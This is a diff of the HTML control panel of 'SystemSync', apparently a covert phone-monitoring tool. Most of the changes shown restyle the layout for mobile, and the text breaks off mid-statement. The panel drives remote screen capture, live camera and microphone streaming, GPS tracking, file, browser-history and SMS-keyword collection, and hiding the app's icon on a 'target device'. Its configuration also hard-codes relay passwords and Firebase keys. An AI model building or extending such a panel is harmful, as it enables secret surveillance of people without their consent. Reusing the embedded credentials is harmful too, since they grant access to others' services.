@@ -13,15 +13,10 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     
     <style>
-        /* ==================== BASE STYLES ==================== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* ==================== RESET & BASE ==================== */
+        * { margin:0; padding:0; box-sizing:border-box; }
 
         body {
-            margin: 0;
             background: #f5f7fa;
             font-family: 'Segoe UI', system-ui, sans-serif;
             display: flex;
@@ -31,119 +26,96 @@
 
         /* ==================== SIDEBAR ==================== */
         #sidebar {
-            width: 280px;
+            width: 260px;
+            min-width: 260px;
             background: white;
             border-right: 1px solid #e0e4e8;
-            padding: 20px;
+            padding: 16px;
             overflow-y: auto;
-            box-shadow: 2px 0 5px rgba(0,0,0,0.02);
-            transition: transform 0.3s ease;
+            overflow-x: hidden;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.04);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
             z-index: 100;
-        }
-
-        @media (max-width: 768px) {
-            #sidebar {
-                position: fixed;
-                top: 0;
-                left: 0;
-                bottom: 0;
-                transform: translateX(-100%);
-                z-index: 1000;
-                background: white;
-                box-shadow: 2px 0 10px rgba(0,0,0,0.1);
-            }
-            #sidebar.open {
-                transform: translateX(0);
-            }
-            .menu-toggle {
-                display: block;
-                position: fixed;
-                top: 15px;
-                left: 15px;
-                z-index: 1001;
-                background: #1976ff;
-                color: white;
-                border: none;
-                border-radius: 8px;
-                padding: 8px 12px;
-                cursor: pointer;
-                font-size: 18px;
-            }
-        }
-        @media (min-width: 769px) {
-            .menu-toggle {
-                display: none;
-            }
-        }
-
-        .menu-toggle {
-            display: none;
+            transition: transform 0.28s cubic-bezier(.4,0,.2,1);
         }
 
         .logo {
-            font-size: 20px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             color: #1976ff;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
-        .section {
-            margin-bottom: 25px;
+        /* Close button - only visible on mobile */
+        #sidebarCloseBtn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+            padding: 2px 6px;
+            width: auto;
+            min-width: unset;
         }
+
+        .section { margin-bottom: 20px; }
 
         .section-title {
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 11px;
+            font-weight: 700;
             color: #7b8a9b;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 12px;
+            letter-spacing: 0.8px;
+            margin-bottom: 8px;
         }
 
-        button {
+        /* Sidebar buttons */
+        #sidebar button {
             width: 100%;
-            padding: 10px 12px;
-            margin: 4px 0;
+            padding: 9px 12px;
+            margin: 2px 0;
             background: white;
             color: #1a2634;
-            border: 1px solid #d0d9e2;
+            border: 1px solid #e8edf2;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             text-align: left;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.15s;
             display: flex;
             align-items: center;
             gap: 8px;
+            min-width: unset;
         }
 
-        button:hover {
+        #sidebar button:hover {
             background: #1976ff;
             color: white;
             border-color: #1976ff;
+            transform: none;
         }
 
+        #sidebar button span:first-child { font-size: 15px; }
+
+        /* ==================== CAMERA PANELS ==================== */
         .camera-panel {
-            background: #f0f2f5;
+            background: #f5f7fa;
             border-radius: 8px;
             padding: 12px;
-            margin: 8px 0;
+            margin: 6px 0;
             display: none;
         }
-
-        .camera-panel.show {
-            display: block;
-        }
-
-        .camera-option {
-            margin: 8px 0;
-        }
-
-        .camera-option label {
-            margin-right: 15px;
-            color: #1a2634;
-        }
-
+        .camera-panel.show { display: block; }
+        .camera-option { margin: 6px 0; font-size: 13px; }
+        .camera-option label { margin-right: 12px; color: #1a2634; }
         .capture-btn, .live-btn {
             background: #1976ff;
             color: white;
@@ -153,30 +125,55 @@
             cursor: pointer;
             width: 100%;
             margin-top: 8px;
+            font-size: 13px;
         }
-
+        .capture-btn:hover, .live-btn:hover { background: #0d5bca; }
         .live-controls {
             display: flex;
-            gap: 8px;
+            gap: 6px;
             margin-top: 10px;
             flex-wrap: wrap;
         }
-
         .live-controls button {
             flex: 1;
             background: #1976ff;
             color: white;
             border: none;
-            padding: 8px 3px;
+            padding: 7px 3px;
             border-radius: 6px;
             cursor: pointer;
             width: auto;
+            min-width: unset;
+            font-size: 12px;
         }
+        .live-controls button.stop { background: #d32f2f; }
 
-        .live-controls button.stop {
-            background: #d32f2f;
+        /* Alerts badge in sidebar */
+        #alertsBadge {
+            background: #fff3e0;
+            border: 1px solid #ff9800;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 12px;
+            margin-top: 8px;
         }
+        #alertsBadge strong { color: #e65100; }
+        #alertsList { max-height: 120px; overflow-y: auto; margin-top: 6px; }
+        #clearAlertsBtn {
+            margin-top: 6px;
+            font-size: 11px;
+            padding: 3px 8px;
+            background: #ff9800;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: auto;
+            min-width: unset;
+        }
+        .ws-debug { font-size: 10px; color: #aaa; margin-top: 6px; }
 
+        /* ==================== MAIN CONTENT ==================== */
         #main {
             flex: 1;
             display: flex;
@@ -186,47 +183,94 @@
         }
 
         #header {
-            height: 60px;
+            height: 56px;
             background: white;
             border-bottom: 1px solid #e0e4e8;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 25px;
+            padding: 0 16px;
             font-weight: 600;
             color: #1a2634;
-            position: relative;
+            flex-shrink: 0;
+            gap: 10px;
+        }
+
+        #header > div:first-child {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 0;
+            flex: 1;
+        }
+
+        /* Hamburger - hidden on desktop, shown on mobile */
+        #menuBtn {
+            display: none;
+            background: none;
+            border: 1px solid #e0e4e8;
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-size: 18px;
+            cursor: pointer;
+            color: #1a2634;
+            flex-shrink: 0;
+            width: auto;
+            min-width: unset;
+        }
+
+        #headerTitle {
+            font-size: 15px;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        #serverInfo {
+            font-size: 11px;
+            color: #1976ff;
+            margin-left: 6px;
+            display: none; /* hidden on mobile, shown on desktop */
         }
 
         #status {
-            padding: 6px 16px;
-            border-radius: 30px;
+            padding: 5px 14px;
+            border-radius: 20px;
             background: #e8f0fe;
             color: #1976ff;
             font-weight: 500;
-            cursor: pointer;
+            font-size: 12px;
+            white-space: nowrap;
         }
+        #status.offline { background: #ffebee; color: #c62828; }
 
-        #status.offline {
-            background: #ffebee;
-            color: #c62828;
-        }
-
-        .reconnect-btn {
+        #reconnectBtn {
             background: #1976ff;
             color: white;
             border: none;
-            border-radius: 20px;
-            padding: 5px 15px;
+            border-radius: 16px;
+            padding: 5px 12px;
             font-size: 12px;
             cursor: pointer;
-            margin-left: 10px;
+            white-space: nowrap;
+            width: auto;
+            min-width: unset;
+        }
+
+        /* Header right group */
+        #header > div:last-child {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0;
         }
 
         #content {
             flex: 1;
-            padding: 20px;
+            padding: 16px;
             overflow: auto;
+            min-height: 0;
         }
 
         #main-panel {
@@ -235,18 +279,36 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
             padding: 20px;
             min-height: 100%;
-            position: relative;
         }
 
-        #map {
-            height: 400px;
-            border-radius: 10px;
+        /* ==================== DOWNLOAD PROGRESS ==================== */
+        #downloadProgress {
+            background: white;
+            border: 1px solid #1976ff;
+            border-radius: 8px;
+            padding: 10px 16px;
+            margin: 0 16px 10px;
+            display: none;
+            font-size: 13px;
+        }
+        #downloadProgress > div:first-child {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        #progressBar {
+            width: 0%;
+            height: 8px;
+            background: #1976ff;
+            border-radius: 4px;
+            transition: width 0.3s ease;
         }
 
+        /* ==================== MAP ==================== */
+        #map { height: 380px; border-radius: 10px; }
         .map-info {
             position: absolute;
-            top: 30px;
-            left: 30px;
+            top: 20px; left: 20px;
             background: rgba(255,255,255,0.95);
             padding: 8px 12px;
             border-radius: 8px;
@@ -254,372 +316,253 @@
             font-size: 13px;
             color: #1a2634;
             z-index: 1000;
-            pointer-events: none;
             border-left: 4px solid #1976ff;
+            pointer-events: none;
         }
 
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-            overflow-x: auto;
-            display: block;
-        }
-
+        /* ==================== TABLES ==================== */
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th {
             background: #f8fafd;
             color: #1a2634;
             font-weight: 600;
-            padding: 12px 10px;
+            padding: 10px 8px;
             text-align: left;
             border-bottom: 2px solid #e0e4e8;
+            white-space: nowrap;
         }
-
         td {
-            padding: 10px;
+            padding: 8px;
             border-bottom: 1px solid #eef2f5;
             color: #2c3e50;
             word-break: break-word;
         }
+        tr:hover { background: #f5f9ff; }
 
-        .file-manager {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-        }
-
+        /* ==================== FILE MANAGER ==================== */
+        .file-manager { display: flex; flex-direction: column; }
         .file-toolbar-sticky {
-            position: sticky;
-            top: 0;
-            background: white;
-            z-index: 100;
-            padding: 12px;
-            border-bottom: 1px solid #eef2f5;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            position: sticky; top: 0;
+            background: white; z-index: 10;
+            padding: 10px; border-bottom: 1px solid #eef2f5;
+            display: flex; align-items: center; gap: 10px;
         }
-
-        .file-toolbar {
-            display: flex;
-            gap: 12px;
+        .file-path {
+            background: #f0f2f5; padding: 5px 12px; border-radius: 6px;
+            font-size: 12px; font-family: monospace; color: #2c3e50;
+            flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
         }
-
-        .file-toolbar button {
-            width: auto;
-            margin: 0;
-            padding: 8px 16px;
-            font-size: 13px;
-            text-align: center;
-            justify-content: center;
+        .tree-content { flex: 1; overflow-y: auto; padding: 12px; }
+        .tree-root, .nested-tree { list-style: none; padding-left: 20px; margin: 0; position: relative; }
+        .tree-root::before, .nested-tree::before {
+            content: ""; position: absolute; top: 0; left: 8px;
+            width: 1px; height: 100%; background: #d1d9e0;
         }
-
-        .file-toolbar .delete-btn {
-            background: #d32f2f;
-            color: white;
-            border: none;
+        .tree-item { position: relative; margin: 3px 0; }
+        .tree-item::before {
+            content: ""; position: absolute; top: 14px; left: -14px;
+            width: 14px; height: 1px; background: #d1d9e0;
         }
-
-        .file-toolbar .download-btn {
-            background: #1976ff;
-            color: white;
-            border: none;
-        }
-
-        .tree-content {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-        }
-
-        .tree-root, .nested-tree {
-            list-style: none;
-            padding-left: 24px;
-            margin: 0;
-            position: relative;
-        }
-
-        .tree-item {
-            position: relative;
-            margin: 4px 0;
-        }
-
         .folder-header, .file-row {
-            display: flex;
-            align-items: center;
-            padding: 6px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.2s;
+            display: flex; align-items: center; padding: 5px 8px;
+            border-radius: 6px; cursor: pointer; transition: background 0.15s;
         }
+        .folder-header:hover, .file-row:hover { background: #f5f7fa; }
+        .folder-icon, .file-icon { font-size: 16px; margin-right: 8px; width: 20px; text-align: center; }
+        .item-name { font-size: 13px; color: #2c3e50; flex: 1; }
+        .file-size { font-size: 11px; color: #94a3b8; margin-left: 8px; white-space: nowrap; }
+        .file-checkbox { width: 14px; height: 14px; margin-right: 8px; cursor: pointer; }
+        .nested-tree { max-height: 0; overflow: hidden; opacity: 0; transition: max-height 0.3s ease, opacity 0.3s; }
+        .nested-tree.show { max-height: 2000px; opacity: 1; }
+        .empty-msg { padding: 16px; color: #94a3b8; font-style: italic; font-size: 13px; }
 
-        .folder-header:hover, .file-row:hover {
-            background: #f5f7fa;
-        }
-
-        .folder-icon, .file-icon {
-            font-size: 18px;
-            margin-right: 10px;
-            display: inline-block;
-            width: 24px;
-            text-align: center;
-        }
-
-        .item-name {
-            font-size: 14px;
-            color: #2c3e50;
-            flex: 1;
-        }
-
-        .file-size {
-            font-size: 11px;
-            color: #94a3b8;
-            margin-left: 10px;
-        }
-
-        .file-checkbox {
-            width: 16px;
-            height: 16px;
-            margin-right: 10px;
-            cursor: pointer;
-        }
-
-        .pagination {
-            margin-top: 20px;
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-        }
-
+        /* ==================== PAGINATION ==================== */
+        .pagination { margin-top: 16px; display: flex; gap: 6px; justify-content: center; flex-wrap: wrap; }
         .page-btn {
-            padding: 6px 12px;
-            border: 1px solid #d0d9e2;
-            background: white;
-            border-radius: 6px;
-            cursor: pointer;
-            color: #1a2634;
+            padding: 5px 10px; border: 1px solid #d0d9e2;
+            background: white; border-radius: 6px; cursor: pointer; color: #1a2634; font-size: 12px;
+            min-width: unset; width: auto;
         }
+        .page-btn:hover { background: #1976ff; color: white; border-color: #1976ff; }
 
+        /* ==================== MODAL / POPUP ==================== */
         .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
+            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+            display: none; justify-content: center; align-items: center; z-index: 10000;
         }
-
-        .modal-overlay.show {
-            display: flex;
-        }
-
+        .modal-overlay.show { display: flex; }
         .mobile-popup {
             width: min(92vw, calc(92vh * 9 / 16));
-            height: 92vh;
-            display: flex;
-            flex-direction: column;
-            background: #0f0f0f;
-            border-radius: 26px;
-            border: 6px solid #2e2e2e;
-            box-shadow: 0 40px 120px rgba(0,0,0,0.9);
-            overflow: hidden;
+            height: min(92vh, calc(92vw * 16 / 9));
+            display: flex; flex-direction: column;
+            background: #0f0f0f; border-radius: 20px;
+            border: 4px solid #2e2e2e;
+            box-shadow: 0 32px 100px rgba(0,0,0,0.95); overflow: hidden;
         }
-
         .phone-frame {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: black;
-            overflow: hidden;
+            flex: 1; min-height: 0;
+            display: flex; background: black; overflow: hidden;
         }
-
         .phone-frame video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            background: black;
+            width: 100%; height: 100%; object-fit: cover; display: block;
         }
-
         .popup-controls {
-            flex-shrink: 0;
-            background: #111;
-            padding: 8px;
-            display: flex;
-            gap: 6px;
-            justify-content: space-around;
-            align-items: center;
+            flex-shrink: 0; background: #111; padding: 10px 12px;
+            display: flex; gap: 8px; justify-content: center; align-items: center;
+            height: 52px; box-sizing: border-box;
         }
-
         .popup-controls button {
-            width: 60px;
-            min-width: 60px;
-            height: 28px;
-            font-size: 12px;
-            background: #1e1e1e;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            text-align: center;
-            justify-content: center;
+            flex: 0 0 auto; width: 44px; height: 32px;
+            background: #1e1e1e; color: white; border: none;
+            border-radius: 8px; cursor: pointer; font-size: 18px;
+            display: flex; align-items: center; justify-content: center;
+            transition: background 0.15s;
+            min-width: unset;
+        }
+        .popup-controls button:hover { background: #3a3a3c; }
+        .popup-controls button.close-btn { background: #c0392b; width: 52px; }
+        .popup-controls button.fullscreen-btn { background: #3a3a3c; }
+        body.modal-open #sidebar, body.modal-open #main {
+            pointer-events: none; filter: blur(4px); transition: filter 0.3s;
         }
 
-        .popup-controls button.close-btn {
-            background: #c0392b;
-        }
-
+        /* ==================== AUTH & DEVICE LIST ==================== */
         #authContainer, #deviceListContainer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #f5f7fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 20000;
+            position: fixed; inset: 0; background: #f5f7fa;
+            display: flex; justify-content: center; align-items: center; z-index: 20000;
         }
-
         #authBox, #deviceListBox {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            width: 350px;
-            max-width: 90%;
+            background: white; padding: 28px; border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.12); width: 340px; max-width: 92%;
         }
-
-        #deviceListBox {
-            width: 500px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        #authBox h2, #deviceListBox h2 {
-            margin-top: 0;
-            color: #1976ff;
-        }
-
+        #deviceListBox { width: 480px; max-height: 80vh; overflow-y: auto; }
+        #authBox h2, #deviceListBox h2 { margin-top: 0; color: #1976ff; }
         #authBox input {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
+            width: 100%; padding: 10px; margin: 6px 0;
+            border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px;
         }
-
         #authBox button, #logoutBtn {
-            width: 100%;
-            padding: 10px;
-            background: #1976ff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
+            width: 100%; padding: 10px; background: #1976ff;
+            color: white; border: none; border-radius: 6px;
+            cursor: pointer; font-size: 15px; margin-top: 8px;
+            min-width: unset;
         }
-
-        #logoutBtn {
-            background: #d32f2f;
-        }
-
+        #logoutBtn { background: #d32f2f; margin-top: 14px; }
         .toggle-link {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1976ff;
-            cursor: pointer;
+            text-align: center; margin-top: 12px; font-size: 13px;
+            color: #1976ff; cursor: pointer;
         }
-
-        #authError {
-            color: #d32f2f;
-            font-size: 13px;
-            margin-top: 8px;
-        }
-
+        .toggle-link:hover { text-decoration: underline; }
+        #authError { color: #d32f2f; font-size: 13px; margin-top: 6px; }
         .device-item {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            border: 1px solid #e0e4e8;
-            border-radius: 8px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
+            display: flex; align-items: center; padding: 12px;
+            border: 1px solid #e0e4e8; border-radius: 8px; margin-bottom: 8px;
+            cursor: pointer; transition: background 0.2s;
         }
+        .device-item:hover { background: #e3f2fd; }
+        .device-icon { font-size: 22px; margin-right: 12px; }
+        .device-info { flex: 1; }
+        .device-name { font-weight: 600; font-size: 15px; }
+        .device-id { font-size: 12px; color: #7b8a9b; }
 
-        .device-item:hover {
-            background: #e3f2fd;
-        }
+        /* ==================== UTILITIES ==================== */
+        .usage-bar { height: 10px; border-radius: 5px; background-color: #1976ff; }
+        .app-usage-item { display: flex; align-items: center; padding: 8px; border-bottom: 1px solid #eef2f5; }
+        .app-usage-name { flex: 1; font-weight: 500; font-size: 13px; }
+        .app-usage-time { width: 80px; text-align: right; color: #666; font-size: 12px; }
+        img, video { max-width: 100%; border-radius: 8px; display: block; margin: 0 auto; }
+        audio { width: 100%; margin-top: 12px; }
 
-        .device-icon {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-
-        .device-info {
-            flex: 1;
-        }
-
-        .device-name {
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .device-id {
-            font-size: 12px;
-            color: #7b8a9b;
-        }
-
-        #downloadProgress {
-            background: #fff;
-            border: 1px solid #1976ff;
-            border-radius: 8px;
-            padding: 10px;
-            margin-bottom: 10px;
+        /* ==================== SIDEBAR OVERLAY (mobile backdrop) ==================== */
+        #sidebarOverlay {
             display: none;
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 99;
         }
 
-        #progressBar {
-            width: 0%;
-            height: 10px;
-            background: #1976ff;
-            border-radius: 4px;
-            transition: width 0.3s ease;
+        /* ==================== INITIALLY HIDDEN (before auth) ==================== */
+        #sidebar, #main { display: none; }
+
+        /* ==================== RESPONSIVE — MOBILE (<= 768px) ==================== */
+        @media (max-width: 768px) {
+            body { overflow: hidden; }
+
+            /* Sidebar slides in as overlay on mobile */
+            #sidebar {
+                position: fixed;
+                top: 0; left: 0; bottom: 0;
+                width: 280px;
+                z-index: 200;
+                transform: translateX(-100%);
+                box-shadow: 4px 0 20px rgba(0,0,0,0.18);
+            }
+
+            /* When open (toggled by JS) */
+            #sidebar.open {
+                transform: translateX(0);
+            }
+
+            /* Show backdrop when sidebar is open */
+            #sidebar.open ~ #sidebarOverlay,
+            #sidebarOverlay.show { display: block; }
+
+            /* Hamburger visible on mobile */
+            #menuBtn { display: flex; }
+
+            /* Close btn inside sidebar */
+            #sidebarCloseBtn { display: flex; }
+
+            /* Hide server info on mobile */
+            #serverInfo { display: none !important; }
+
+            /* Main takes full width */
+            #main { width: 100%; }
+
+            /* Smaller header */
+            #header { padding: 0 12px; height: 52px; }
+            #headerTitle { font-size: 14px; }
+
+            /* Content padding smaller */
+            #content { padding: 10px; }
+            #main-panel { padding: 14px; border-radius: 8px; }
+
+            /* Table on mobile — horizontal scroll */
+            .table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+            table { min-width: 480px; }
+
+            /* Map smaller on mobile */
+            #map { height: 280px; }
+
+            /* Popup smaller on mobile */
+            .mobile-popup {
+                width: 96vw;
+                height: min(94vh, calc(96vw * 16 / 9));
+            }
         }
 
-        .app-usage-item {
-            display: flex;
-            align-items: center;
-            padding: 8px;
-            border-bottom: 1px solid #eef2f5;
-        }
+        /* ==================== RESPONSIVE — DESKTOP (> 768px) ==================== */
+        @media (min-width: 769px) {
+            /* Sidebar always visible on desktop */
+            #sidebar {
+                position: relative;
+                transform: none !important;
+                display: flex !important; /* overrides JS-hidden state after auth */
+            }
 
-        .app-usage-name {
-            flex: 1;
-            font-weight: 500;
-        }
+            /* Hamburger hidden on desktop */
+            #menuBtn { display: none !important; }
+            #sidebarCloseBtn { display: none !important; }
+            #sidebarOverlay { display: none !important; }
 
-        .usage-bar {
-            height: 10px;
-            border-radius: 5px;
-            background-color: #1976ff;
-        }
-
-        #sidebar, #main {
-            display: none;
+            /* Server info visible on desktop */
+            #serverInfo { display: inline !important; }
         }
     </style>
 </head>
 <body>
 
-<button class="menu-toggle" id="menuToggle">☰</button>
-
+<!-- AUTHENTICATION CONTAINER (login) -->
 <div id="authContainer">
     <div id="authBox">
         <h2>🔐 SystemSync Login</h2>
@@ -632,6 +575,7 @@
     </div>
 </div>
 
+<!-- DEVICE LIST CONTAINER (shown after login) -->
 <div id="deviceListContainer" style="display: none;">
     <div id="deviceListBox">
         <h2>📱 Your Devices</h2>
@@ -640,6 +584,7 @@
     </div>
 </div>
 
+<!-- MODAL OVERLAY for screen share -->
 <div id="screenModalOverlay" class="modal-overlay">
     <div class="mobile-popup">
         <div class="phone-frame">
@@ -654,27 +599,44 @@
     </div>
 </div>
 
+<!-- SIDEBAR -->
+<!-- Mobile overlay backdrop -->
+<div id="sidebarOverlay" onclick="closeSidebar()"></div>
+
 <div id="sidebar">
-    <div class="logo">SystemSync 🔗</div>
+    <div class="logo">SystemSync 🔗 <button id="sidebarCloseBtn" onclick="closeSidebar()" title="Close menu">✕</button></div>
+
     <div class="section">
         <div class="section-title">Surveillance</div>
         <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
         <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
         <div id="clickCameraPanel" class="camera-panel">
-            <div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label><label><input type="radio" name="clickCameraSelect" value="back"> Rear</label></div>
-            <div class="camera-option"><label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label></div>
+            <div class="camera-option">
+                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
+                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
+            </div>
+            <div class="camera-option">
+                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
+            </div>
             <button class="capture-btn" id="capturePictureBtn">TAKE A PICTURE</button>
         </div>
         <button id="liveCameraBtn"><span>📹</span> See Live</button>
         <div id="liveCameraPanel" class="camera-panel">
-            <div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label></div>
-            <div class="camera-option"><label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div>
+            <div class="camera-option">
+                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
+                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
+            </div>
+            <div class="camera-option">
+                <label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label>
+                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
+            </div>
             <button class="live-btn" id="startLiveStreamBtn">See Live</button>
         </div>
         <button id="liveAudioBtn"><span>🎤</span> <span>Live Audio</span></button>
         <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop Live Audio</button>
         <button id="getLocationBtn"><span>📍</span> GPS Location</button>
     </div>
+
     <div class="section">
         <div class="section-title">Data</div>
         <button id="fileManagerBtn"><span>📂</span> File Manager</button>
@@ -686,6 +648,7 @@
         <button id="browserHistoryBtn"><span>🌐</span> Browser History</button>
         <button id="wifiNetworksBtn"><span>📶</span> Wi-Fi Networks</button>
     </div>
+
     <div class="section">
         <div class="section-title">Monitoring</div>
         <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
@@ -701,6 +664,7 @@
         <button id="appEventsBtn"><span>📦</span> App Events</button>
         <button id="smsKeywordsBtn"><span>🔑</span> SMS Keywords</button>
     </div>
+
     <div class="section">
         <div class="section-title">Control</div>
         <button id="toggleAppIconBtn"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
@@ -710,38 +674,102 @@
         <button id="toggleFlashBtn"><span>🔦</span> <span id="flashBtn">Flash On</span></button>
         <button id="flashTimedBtn"><span>⏱️</span> Flash 5s</button>
     </div>
-    <div id="alertsBadge" style="display:none;"><div><strong>⚠️ Alerts</strong><div id="alertsList"></div><button id="clearAlertsBtn">Clear</button></div></div>
+
+    <div id="alertsBadge" style="display:none;">
+        <div>
+            <strong>⚠️ Alerts</strong>
+            <div id="alertsList"></div>
+            <button id="clearAlertsBtn">Clear</button>
+        </div>
+    </div>
     <div class="ws-debug" id="wsDebug">🌐 WebSocket: idle</div>
 </div>
 
+<!-- MAIN CONTENT -->
 <div id="main">
     <div id="header">
-        <div>Control Panel <span id="serverInfo">mirror-view.onrender.com</span></div>
-        <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲ Reconnect</button></div>
+        <div>
+                <button id="menuBtn" onclick="toggleSidebar()" title="Menu">☰</button>
+                <span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span></span>
+            </div>
+        <div>
+            <span id="status">CONNECTING</span>
+            <button id="reconnectBtn">⟲ Reconnect</button>
+        </div>
     </div>
-    <div id="downloadProgress"><div><span id="progressFileName">Downloading...</span><span id="progressPercent">0%</span></div><div><div id="progressBar"></div></div></div>
-    <div id="content"><div id="main-panel">🔌 Initializing connection... <br><small>Ensure the target device is online and server is reachable.</small></div></div>
+    <div id="downloadProgress">
+        <div>
+            <span id="progressFileName">Downloading...</span>
+            <span id="progressPercent">0%</span>
+        </div>
+        <div>
+            <div id="progressBar"></div>
+        </div>
+    </div>
+    <div id="content">
+        <div id="main-panel">
+            🔌 Initializing connection... <br><small>Ensure the target device is online and server is reachable.</small>
+        </div>
+    </div>
 </div>
 
 <script>
+    // ==================== CONFIGURATION ====================
     const CONFIG = {
         WS_URL: "wss://mirror-view.onrender.com",
         MAX_RECONNECT_DELAY: 30000,
-        ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
+        ICE_SERVERS: [
+            { urls: "stun:stun.relay.metered.ca:80" },
+            { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+            { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+            { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+            { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
+        ],
         FIREBASE_CONFIG: {
             apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
             authDomain: "webviewiot.firebaseapp.com",
+            databaseURL: "https://webviewiot-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "webviewiot",
             storageBucket: "webviewiot.firebasestorage.app",
             messagingSenderId: "634777347775",
-            appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a"
+            appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+            measurementId: "G-2KW4EJYTRB"
         }
     };
 
+    // ==================== SIDEBAR TOGGLE (MOBILE) ====================
+    function toggleSidebar() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('sidebarOverlay');
+        if (sb) sb.classList.toggle('open');
+        if (ov) ov.classList.toggle('show');
+    }
+    function closeSidebar() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('sidebarOverlay');
+        if (sb) sb.classList.remove('open');
+        if (ov) ov.classList.remove('show');
+    }
+    // Close sidebar when any sidebar button is clicked (mobile UX)
+    document.addEventListener('click', function(e) {
+        if (window.innerWidth > 768) return;
+        const sb = document.getElementById('sidebar');
+        if (!sb || !sb.classList.contains('open')) return;
+        // If click is on a sidebar button (not the menu/close buttons)
+        if (e.target.closest('#sidebar') && !e.target.closest('#menuBtn') &&
